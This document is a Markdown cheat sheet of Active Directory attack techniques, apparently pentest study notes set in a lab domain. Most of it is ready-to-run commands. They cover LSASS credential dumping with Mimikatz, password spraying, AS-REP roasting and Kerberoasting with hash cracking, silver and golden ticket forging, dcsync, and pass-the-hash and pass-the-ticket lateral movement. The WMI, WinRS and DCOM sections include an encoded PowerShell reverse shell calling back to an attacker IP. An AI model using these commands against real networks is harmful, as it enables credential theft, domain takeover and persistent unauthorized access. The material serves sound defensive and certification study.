# Enumeration
## Enumeration Using Legacy Windows Tools
- Get users in the domain
```
net user /domain
```
- Get specific user details in the domain
```
net user <username> /domain
```
- Get groups in the domain
```
net group /domain
```
- Get group details in the domain
```
net group "<group-name>" /domain
```
- We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all Service Principal Names in the domain. Since the information is registered and stored in AD, it is present on the domain controller. To obtain the data, we will again query the DC, this time searching for specific SPNs. (SECOND METHOD IS IN POWERVIEW)
```
setspn -L <domain-user-name>
```
## PowerShell and .NET Classes
PowerShell cmdlets like `Get-ADUser` work well but they are only installed by default on domain controllers as part of the Remote Server Administration Tools (RSAT).
- Getting the required hostname for the PDC - `PdcRoleOwner` (PS)
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
- Getting the DN
```
([adsi]'').distinguishedName
```
- Getting LDAP URL. Example: `LDAP://DC1.corp.com/DC=corp,DC=com`
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
- Getting `DirectoryEntry`
```
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
```
- Getting `DirectorySearcher`
```
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
- Enumerate all the users in DC
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```
## [PoverView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- Import the module
```
Import-Module .\PowerView.ps1
```
- Getting the DC information
```
Get-NetDomain
```
- Get User details
```
Get-NetUser
```
It is possible to filter it too:
```
Get-NetUser | select cn
```
```
Get-NetUser | select cn,pwdlastset,lastlogon
```
- Getting Group details
```
Get-NetGroup | select cn
```
- Getting group members
```
Get-NetGroup "Sales Department" | select member
```
- https://powersploit.readthedocs.io/en/latest/Recon/
- Get computer details
```
Get-NetComputer
```
- Scanning the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
```
Find-LocalAdminAccess
```
- Which user is logged in to which computer
```
Get-NetSession -ComputerName <computer-name> -Verbose
```
- Enumerating Service Principal Names 
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### Enumerating Object Permissions
Juicy Permissions:
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
- Enumerate the user's ACE (Access Control Entry). The main points are `ObjectSID`, `ActiveDirectoryRights`, `SecurityIdentifier`.
```
Get-ObjectAcl -Identity <username>
```
- Conver SID to Name
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
- Check if any users have GenericAll permissions
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
- Find interesting ACLs
```
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
```
### Enumerating Domain Shares
- Finding shares in the domain
```
Find-DomainShare
```
- Finding accessible shares in the domain for the current user
```
Find-DomainShare -CheckShareAccess
```
- SYSVOL share
```
ls \\dc1.corp.com\sysvol\corp.com\

# Finding old policy file
ls \\dc1.corp.com\sysvol\corp.com\Policies\

#Find password in it
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml

#Decrypt the password
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
## PsLoggedOn
- To find logged on users on hosts
```
.\PsLoggedon.exe \\files04
```
---
## [SharpHound](https://github.com/BloodHoundAD/SharpHound)
Data Collector for BloodHound
- Import the script
```
Import-Module .\Sharphound.ps1
```
- we'll attempt to gather All data, which will perform all collection methods except for local group policies.
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
Now transfer `.zip` file to the Kali. `.bin` file is a cache file and it is not required. It is okay to delete it.
## [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- Start Neo4j db
```
sudo neo4j start
```
- Initialize Neo4j (neo4j:neo4j)
```
http://localhost:7474
```
- Start Bloodhound
```
bloodhound
```
1. Connet neo4j (neo4j:Neo4j)
2. Upload Data
3. Analyze
Note: This plays directly into the second Shortest Path we'd like to show for this Module, namely the Shortest Paths to Domain Admins from Owned Principals. If we run this query against corp.com without configuring BloodHound, we receive a "NO DATA RETURNED FROM QUERY" message. However, the Owned Principals plays a big role here, and refers to the objects we are currently in control of in the domain. In order to analyze, we can mark any object we'd like as owned in BloodHound, even if we haven't obtained access to them. Sometimes it is a good idea to think in the lines of "what if" when it comes to AD assessments. In this case however, we will leave the imagination on the side and focus on the objects we in fact have control over. In order for us to obtain an owned principal in BloodHound, we will run a search (top left), right click the object that shows in the middle of the screen, and click Mark User as Owned. A principal marked as owned is shown in BloodHound with a skull icon next to the node itself. We'll repeat the process for CLIENT75 as well, however in this case we click Mark Computer as Owned, and we end up having two owned principals. Now that we informed BloodHound about our owned principals, we can run the Shortest Paths to Domain Admins from Owned Principals query.
---
# Authentication
## NTLM
- NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server.
- Challenge-and-response paradigm
## Kerberos
- Uses a ticket system
```
Authentication Server Request (AS-REQ)
Authentication Server Reply (AS-REP)
Key Distribution Center (KDC)
Ticket Granting Ticket (TGT)
Ticket Granting Service Request (TGS-REQ)
Ticket Granting Server Reply (TGS-REP)
```
## Cached AD Credentials
```
Local Security Authority Subsystem Service (LSASS)
```
- execute Mimikatz directly from memory using an injector like PowerShell
- use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz
```
.\mimikatz.exe
```
- privilege::debug to engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account.
```
privilege::debug
```
- sekurlsa::logonpasswords to dump the credentials of all logged-on users
```
sekurlsa::logonpasswords
```
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets.
- List the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
```
dir \\web04.corp.com\backup
```
- Use Mimikatz to show the tickets that are stored in memory by entering `sekurlsa::tickets`.
```
sekurlsa::tickets
```
The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
### Digital Certificates
We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with `crypto::capi` or KeyIso service with `crypto::cng`, making non-exportable keys exportable.
## Password Attacks
- Get Account lockout policy
```
net accounts
```
- Password spraying attack using LDAP and ADSI
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")
```
If the password for the user account is correct, the object creation will be successful:
```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
If the password is invalid, no object will be created and we will receive an exception:
```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```
- [Spray-Passwords.ps1](https://gist.github.com/m3t3kh4n/4d190b021c8189535cee9ebf229a87cd)
The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag. The PowerShell script automatically identifies domain users and sprays a password against them.
```
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
- Password spraying using `crackmapexec` in SMB
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
crackmapexec added `Pwn3d!` to the output, indicating that the user has administrative privileges on the target system

**`crackmapexec` using NTLM Hash**
```
crackmapexec smb 192.168.248.70-76 -u jeffadmin -H e460605a9dbd55097c6cf77af2f89a03 -d corp.com --continue-on-success
```
- Password spraying using Kerberos TGT
We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT.
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
## AS-REP Roasting
The first step of the authentication process via Kerberos is to send an `AS-REQ`. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as Kerberos preauthentication. Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting.
### impacket-GetNPUsers
From Kali:
```
impacket-GetNPUsers -dc-ip <dc-ip-addrress>  -request -outputfile <hash-output-filename> <domain>/<user>
```
By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly. Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
### Rubeus
From Windows:
```
.\Rubeus.exe asreproast /nowrap
```
**To identify users with the enabled AD user account option `Do not require Kerberos preauthentication`, we can use PowerView's `Get-DomainUser` function with the option `-PreauthNotRequired` on Windows. On Kali, we can use `impacket-GetNPUsers` as shown in listing 14 without the `-request` and `-outputfile` options.**
## Kerberoasting
We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN. When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.
- Get Hash (from Windows):
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- Get Hash (from Linux):
```
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
If `impacket-GetUserSPNs` throws the error "`KRB_AP_ERR_SKEW(Clock skew too great)`," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
- Crack Hash:
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Let's assume that we are performing an assessment and notice that we have `GenericWrite` or `GenericAll` permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure.
## Silver Tickets
Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller. Privileged Account Certificate (PAC)1 validation2 is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation. As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket. With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket3 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

In general, we need to collect the following three pieces of information to create a silver ticket:
1. SPN password hash
2. Domain SID
3. Target SPN

Since we are a local Administrator on this machine where `iis_service` has an established session, we can use Mimikatz to retrieve the **SPN password hash** (NTLM hash of iis_service), which is the first piece of information we need to create a silver ticket. Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials.
- Get NTLM hash of the service account:
```
privilege::debug
```
```
sekurlsa::logonpasswords
```
The NTLM hash of the service account is the first piece of information we need to create the silver ticket.

- Get the domain SID
```
whoami /user
```
Now, let's obtain the domain SID, the second piece of information we need. We can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.
```
USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
This part: **`S-1-5-21-1987370270-658905905-1781884369`**.
As covered in the Windows Privilege Escalation Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user.

- The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the `kerberos::golden` module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module Lateral Movement in Active Directory.
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 ) as highlighted above.

- This means we should have the ticket ready to use in memory. We can confirm this with klist.
```
klist
```

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

## Domain Controller Synchronization (dcsync)

To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned. If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
- Desync from Windows:
```
.\mimikatz.exe
```
```
lsadump::dcsync /user:corp\dave
```
- Desync from Kali:
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
- Crack the hash:
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
---
# Lateral Movement
## WMI and WinRM

### WMI
- WMI is used for task automation
- we need credentials of a member of the Administrators local group
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
1. create a PSCredential object that will store our session username and password
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
2. create a Common Information Model (CIM) via the _New-CimSession cmdlet
```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```
3. tie together all the arguments we configured previously by issuing the Invoke-CimMethod cmdlet and supplying Win32_Process and Create as ClassName and MethodName
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
We could replace the previous payload with a full reverse shell written in PowerShell. First, we'll encode the PowerShell reverse shell so we don't need to escape any special characters when inserting it as a WMI payload. The following Python code encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
Run the command:
```
python3 encode.py
```
After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74 and run the PowerShell WMI script with the newly generated encoded reverse-shell payload.
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
### `winrs`
- For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```
In Reverse shell format:
```
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
### WinRM
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
```
Enter-PSSession <session-id>
```
## PsExec
- the user that authenticates to the target machine needs to be part of the Administrators local group
- `ADMIN$` share must be available
- File and Printer Sharing has to be turned on
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
On Kali:
```
impacket-psexec 192.168.248.72 /user:jeffadmin /ntlm:e460605a9dbd55097c6cf77af2f89a03
```
Best:
```
impacket-psexec -hashes 00000000000000000000000000000000:e460605a9dbd55097c6cf77af2f89a03 jeffadmin@192.168.248.72
```

## Evil-WinRM
```
evil-winrm -i 10.10.113.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
```
Also,
- `upload <filename>`
- `download <filename>`
**If you want to use the Evil-WinRM via Kerberos authentication (in case NTLM is disabled), you need to change the `/etc/krb5.conf` file:**
```
[libdefaults]
    default_realm = DOMAIN.LOCAL

[realms]
    DOMAIN.LOCAL = {
      kdc = dc1.domain.local
    }

[domain_realm]
    .domain.local = REALCORP.HTB
    domain.local = REALCORP.HTB
```
After that:
- impacket-gettgt
- export file
- verify
Finally:
```
evil-winrm -r DOMAIN.LOCAL -i dc01.domain.local
```

## Pass the Hash
- this will not work for Kerberos authentication but only for servers or services using NTLM authentication.
- https://github.com/byt3bl33d3r/pth-toolkit
- https://github.com/fortra/impacket/blob/master/examples/smbclient.py
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
## Overpass the Hash
- https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
- With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
- The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.
- The command requires a few arguments and creates a new PowerShell process in the context of jen. This new PowerShell prompt will allow us to obtain Kerberos tickets without performing NTLM authentication over the network, making this attack different than a traditional pass-the-hash.
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
- At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and it does not inspect any imported kerberos tickets
- Let's list the cached Kerberos tickets with klist.
```
klist
```
- No Kerberos tickets have been cached, but this is expected since jen has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with net use.
```
net use \\files04
```
```
klist
```
We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we may reuse the TGT to obtain code execution on the files04 host. Let's try that now, running .\PsExec.exe to launch cmd remotely on the \\files04 machine as jen.
```
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\files04 cmd
```

**As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server. Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user.**

We used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

## Pass the Ticket
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of dave. The dave user has privileged access to the backup folder located on WEB04 where our logged in user jen does not. To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
- Let's first log in as jen to CLIENT76 and verify that we are unable to access the resource on WEB04. To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.
```
whoami
ls \\web04\backup
```
- Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export command.
```
privilege::debug
```
```
sekurlsa::tickets /export
```
The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format. Because inspecting the generated tickets indicates that dave had initiated a session, we can try to inject one of their tickets inside jen's sessions. We can verify newly generated tickets with dir, filtering out on the kirbi extension.
```
dir *.kirbi
```
- As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
- No errors have been thrown, meaning that we should expect the ticket in our session when running klist.
```
klist
```
- We notice that the dave ticket has been successfully imported in our own session for the jen user. Let's confirm we have been granted access to the restricted shared folder.
```
ls \\web04\backup
```

## DCOM
- Distributed Component Object Model (DCOM)
The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
- We are going to demonstrate this lateral movement attack as the jen user logged in from the already compromised Windows 11 CLIENT74 host. From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
- Once the application object is saved into the $dcom variable, we can pass the required argument to the application via the ExecuteShellCommand method. The method accepts four parameters: Command, Directory, Parameters, and WindowState. We're only interested in the first and third parameters, which will be populated with cmd and /c calc, respectively.
```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
- Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app. Because it's within Session 0, we can verify the calculator app is running with tasklist and filtering out the output with findstr.
```
tasklist | findstr "calc"
```
- We can now improve our craft by extending this attack to a full reverse shell similar to what we did in the WMI and WinRM section earlier in this Module. Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it.
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
- Switching to our Kali machine, we can verify any incoming connections on the listener that we simultaneously set up.
```
nc -lnvp 443
```
---
# Persistence
## Golden Ticket
Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt.1 If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
- To test this persistence technique, we will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a traditional command shell with the cmd command. This should fail because we do not have the proper permissions.
```
PsExec64.exe \\DC1 cmd.exe
```
- At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself in order to work as a persistence method. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz. To simulate this, we'll log in to the domain controller via remote desktop using the jeffadmin account, run Mimikatz from C:\Tools, and issue the lsadump::lsa command as displayed below:
```
privilege::debug
```
```
lsadump::lsa /patch
```
**Having obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now forge and inject our golden ticket.**
- Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain. We'll take the hash and continue the procedure from a compromised workstation. Back on CLIENT74 as the jen user, before generating the golden ticket, we'll launch mimikatz and delete any existing Kerberos tickets with kerberos::purge. We'll supply the domain SID (which we can gather with whoami /user) to the Mimikatz kerberos::golden5 command to create the golden ticket. This time, we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022,6 we'll need to provide an existing account, so let's set the golden ticket's username to jen.
```
kerberos::purge
```
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
```
misc::cmd
```
Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group. With the golden ticket injected into memory, we've launched a new command prompt with misc::cmd from which we again attempt lateral movement with PsExec.
```
PsExec.exe \\dc1 cmd.exe
```
**Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.**
```
psexec.exe \\192.168.50.70 cmd.exe
```
## Shadow Copies
- To start off, we'll connect as the jeffadmin domain admin user to the DC1 domain controller and launch from an elevated prompt the vshadow utility with -nw options to disable writers,5 which speeds up backup creation and include the -p option to store the copy on disk.
```
vshadow.exe -nw -p  C:
``` 
- Once the snapshot has been taken successfully, we should take note of the shadow copy device name. We'll now copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and append the full ntds.dit path.
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
- As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the reg utility and the save argument.
```
reg.exe save hklm\system c:\system.bak
```
- Once the two .bak files are moved to our Kali machine, we can continue extracting the credential materials with the secretsdump tool from the impacket suite. We'll supply the ntds database and the system hive via -ntds and -system, respectively along with the LOCAL keyword to parse the files locally.
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

# `kerbrute` (For example NTLM is disabled)
- Check users
```
./kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```
- Password spraying
```
./kerbrute passwordspray -d domain.local --dc dc01.domain.local password.txt username
```

